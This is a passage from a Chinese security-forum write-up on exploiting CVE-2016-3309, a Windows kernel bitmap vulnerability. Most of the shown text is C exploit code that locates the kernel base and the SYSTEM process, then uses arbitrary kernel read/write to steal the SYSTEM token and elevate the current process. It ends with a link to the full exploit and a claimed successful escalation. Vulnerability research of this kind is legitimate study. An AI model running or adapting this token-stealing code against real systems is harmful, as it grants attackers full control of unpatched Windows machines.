
```
ULONG64 GetNTBase()

{

	ULONG64 Base[0x1000];

	DWORD dwRet = 0;

	ULONG64 ulKrnlBase = 0;



	if (EnumDeviceDrivers((LPVOID*)&Base, sizeof(Base), &dwRet))

	{

		ulKrnlBase = Base[0];

	}

	else

	{

		ShowError("EnumDeviceDrivers", GetLastError());

	}



	return ulKrnlBase;

}



ULONG64 GetSystemProcess()

{

	HMODULE hModel = NULL;

	ULONG64 ulAddress = 0, ulOSBase = 0, ulRes = 0;



	ulOSBase = GetNTBase();

	if (ulOSBase == 0)

	{

		goto exit;

	}



	hModel = LoadLibrary("ntoskrnl.exe");

	if (!hModel)

	{

		ShowError("LoadLibrary", GetLastError());

		goto exit;

	}



	ulAddress = (ULONG64)GetProcAddress(hModel, "PsInitialSystemProcess");

	if (!ulAddress)

	{

		ShowError("GetProcAddress", GetLastError());

		goto exit;

	}



	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;



exit:

	return ulRes;

}
```

有了System进程的EPROCESS地址，就可以通过上面实现的任意地址读写的功能来实现Token的替换，相应代码如下：

```
BOOL EnablePrivilege_CVE_2016_3309()

{

	BOOL bRet = TRUE;

	CONST DWORD dwTokenOffset = 0x358, dwLinkOffset = 0x2F0, dwPIDOffset = 0x2E8;

	ULONG64 ulSystemToken = 0, ulEprocess = 0;



	ulEprocess = GetSystemEprocess_CVE_2016_3309();

	if (!ulEprocess)

	{

		bRet = FALSE;

		goto exit;

	}



	if (!BitMapRead_CVE_2016_3309(ulEprocess + dwTokenOffset,

		(PBYTE)&ulSystemToken,

		sizeof(ULONG64)))

	{

		bRet = FALSE;

		goto exit;

	}



	ULONG64 ulCurPID = GetCurrentProcessId(), ulPID = 0;



	do {

		if (!BitMapRead_CVE_2016_3309(ulEprocess + dwLinkOffset,

			(PBYTE)&ulEprocess, sizeof(ULONG64)))

		{

			bRet = FALSE;

			goto exit;

		}



		ulEprocess = ulEprocess - dwLinkOffset;



		if (!BitMapRead_CVE_2016_3309(ulEprocess + dwPIDOffset,

			(PBYTE)&ulPID, sizeof(ULONG64)))

		{

			bRet = FALSE;

			goto exit;

		}

	} while (ulPID != ulCurPID);



	if (!BitMapWrite_CVE_2016_3309(ulEprocess + dwTokenOffset, (PBYTE)&ulSystemToken, sizeof(ULONG64)))

	{

		bRet = FALSE;

		goto exit;

	}



exit:

	return bRet;

}



ULONG64 GetSystemEprocess_CVE_2016_3309()

{

	ULONG64 ulSystemAddr = GetSystemProcess();



	if (!ulSystemAddr)

	{

		goto exit;

	}



	ULONG64 ulSystemEprocess = 0;



	if (!BitMapRead_CVE_2016_3309(ulSystemAddr,

				      (PBYTE)&ulSystemEprocess,

				      sizeof(ULONG64)))

	{

		goto exit;

	}



exit:

	return ulSystemEprocess;

}
```

完整的exp地址保存在：[**2e1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9#2k6Y4R3$3y4q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4y4h3k6^5y4U0c8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5$3i4K6u0V1x3K6x3H3z5g2)9J5k6h3y4H3M7l9`.`.**](https://bbs.kanxue.com/elink@dd4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9#2k6Y4R3$3y4q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4y4h3k6^5y4U0c8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5$3i4K6u0V1x3K6x3H3z5g2)9J5k6h3y4H3M7l9`.`.)。运行程序，可以看到提权成功：

![](https://bbs.kanxue.com/upload/attach/202205/835440_ZV9H8E66VQHVCZ3.jpg)

# 五.参考资料

- [**136K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5$3z5o6b7J5**](https://bbs.kanxue.com/elink@b7dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5$3z5o6b7J5)

- [**f7cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5z5e0p5&6**](https://bbs.kanxue.com/elink@d9eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5z5e0p5&6)

- [**aa2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3&6K6k6i4m8G2M7%4c8Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4y4#2)9J5c8X3g2^5M7r3I4G2K9i4c8A6L8X3N6Q4x3X3c8E0M7K6p5$3i4K6u0V1x3o6V1^5i4K6u0V1M7X3N6F1L8$3u0B7i4K6u0V1K9h3&6@1k6h3N6W2M7W2)9J5k6r3!0$3k6i4u0X3L8r3!0%4i4K6u0V1L8$3&6Q4x3X3c8%4K9h3&6V1L8%4N6K6i4K6u0V1z5q4)9J5k6e0q4Q4x3X3c8^5y4U0c8Q4x3X3c8T1K9i4c8Q4x3X3c8T1P5g2)9J5k6r3q4T1N6i4y4A6L8X3N6Q4x3X3c8Y4k6r3W2Q4x3X3c8G2j5X3A6W2j5%4c8K6i4K6u0r3**](https://bbs.kanxue.com/elink@de4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3&6K6k6i4m8G2M7%4c8Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4y4#2)9J5c8X3g2^5M7r3I4G2K9i4c8A6L8X3N6Q4x3X3c8E0M7K6p5$3i4K6u0V1x3o6V1^5i4K6u0V1M7X3N6F1L8$3u0B7i4K6u0V1K9h3&6@1k6h3N6W2M7W2)9J5k6r3!0$3k6i4u0X3L8r3!0%4i4K6u0V1L8$3&6Q4x3X3c8%4K9h3&6V1L8%4N6K6i4K6u0V1z5q4)9J5k6e0q4Q4x3X3c8^5y4U0c8Q4x3X3c8T1K9i4c8Q4x3X3c8T1P5g2)9J5k6r3q4T1N6i4y4A6L8X3N6Q4x3X3c8Y4k6r3W2Q4x3X3c8G2j5X3A6W2j5%4c8K6i4K6u0r3)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-8-6 10:39

被1900编辑

，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
